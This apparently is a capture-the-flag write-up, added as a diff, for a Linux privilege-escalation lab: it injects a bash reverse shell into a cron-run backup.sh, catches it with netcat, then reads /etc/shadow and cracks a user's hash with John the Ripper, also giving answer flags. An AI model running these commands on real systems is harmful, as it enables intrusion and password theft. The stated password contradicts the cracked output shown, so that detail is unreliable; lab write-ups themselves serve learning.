@@ -1,0 +1,73 @@
+# How many user-defined cron jobs can you see on the target system?
+
+--> Navigate to root directory by command "cd /"  and go to /etc/. After that read the contents of crontab file by cat crontab
+--> However you can directly read by writting cat /etc/crontab
+
+Answer : there are 4 user defined cron jobs
+
+# What is the content of the flag5.txt file? 
+
+--> This is bit tricky. 
+As you'll follow the process and go to home directory of user karen. You'll see a file named as "backup.sh". 
+Once you check the content , there is nothing of use. As it only makes the zip of some folder. 
+However we can make use of it to generate reverse shell. 
+OH! NO !  😥 
+You have the write access but not the execution access. Let's modify the bash script file by following command:
+
+chmod u+x backup.sh
+
+😍 you're good to now. 
+
+open file with your favourite text editor and enter the following code to generate reverse shell. 
+
+#!/bin/bash
+bash -i >& /dev/tcp/10.0.2.15/6666 0>&1
+
+NOTE 🙄 : Change this IP address with your Virtual Machine Ip address. 
+
+Let's proceed, run this command to have reserse shell connection and It will auto give you root privileges:
+
+nc -nlvp 6666
+
+Bravo ! 😎 , you made it. Redirect to ubuntu user and read the content of the file flag5.txt:
+
+Answer : THM-383000283
+
+
+# What is Matt's password?
+
+Matt's? Where is it comming from because there is no file or clue ? 
+Stop for moment, did you check the /etc/passwd?
+Yeah, exactly you need to check all the user that are available. You found user "Matt". that's good 
+But question is how would you come to know the password of Matt user?
+As you're root user now, head to directory /etc/shadow to read the hash of password of Matt.
+Thinking what to do next? 🤔 You forgot John the Ripper ? , If no , then let's crack it 
+
+Store the username and hash of password in different file. unshadow the file into another file and Run the john ripper tool. 
+following will commands will guide you through the way : 
+
+┌──(user㉿kali)-[~/Desktop]
+└─$ ls
+hash  names  password
+
+┌──(user㉿kali)-[~/Desktop]
+└─$ unshadow names hash > passwords
+
+┌──(muneer㉿kali)-[~/Desktop]
+└─$ john /usr/sbin/ passwords 
+Using default input encoding: UTF-8
+Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])
+Cost 1 (iteration count) is 5000 for all loaded hashes
+Will run 2 OpenMP threads
+Proceeding with single, rules:Single
+Press 'q' or Ctrl-C to abort, almost any other key for status
+Warning: Only 2 candidates buffered for the current salt, minimum 8 needed for performance.
+Almost done: Processing the remaining buffered candidate passwords, if any.
+Proceeding with wordlist:/usr/share/john/password.lst
+123456           (matt)     
+1g 0:00:00:01 DONE 2/3 (2024-04-17 16:11) 0.6756g/s 654.0p/s 654.0c/s 654.0C/s 123456..john
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+
+
+Answer : 12345
